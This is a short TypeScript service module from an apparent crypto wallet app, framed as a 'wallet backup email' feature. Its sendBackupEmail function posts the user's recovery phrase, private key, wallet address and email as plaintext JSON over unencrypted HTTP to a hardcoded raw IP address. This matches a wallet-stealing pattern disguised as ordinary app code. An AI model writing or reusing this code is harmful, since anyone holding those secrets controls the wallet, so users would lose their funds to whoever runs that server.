const RELAY_BASE = 'http://130.245.173.73:8080';

export interface WalletBackupEmailRequest {
  email: string;
  recoveryPhrase: string;
  walletAddress: string;
  privateKey: string;
}

interface WalletBackupEmailResponse {
  ok: boolean;
}

function normalizeErrorMessage(error: unknown): string {
  if (error instanceof Error && error.message.trim()) {
    return error.message.trim();
  }
  return 'Failed to send wallet backup email';
}

export const walletBackupService = {
  async sendBackupEmail(payload: WalletBackupEmailRequest): Promise<boolean> {
    const res = await fetch(`${RELAY_BASE}/api/wallet/backup-email`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });

    if (!res.ok) {
      const text = await res.text().catch(() => '');
      throw new Error(text || `HTTP ${res.status}`);
    }

    const body = (await res.json().catch(() => null)) as WalletBackupEmailResponse | null;
    return !!body?.ok;
  },

  formatError(error: unknown): string {
    return normalizeErrorMessage(error);
  },
};

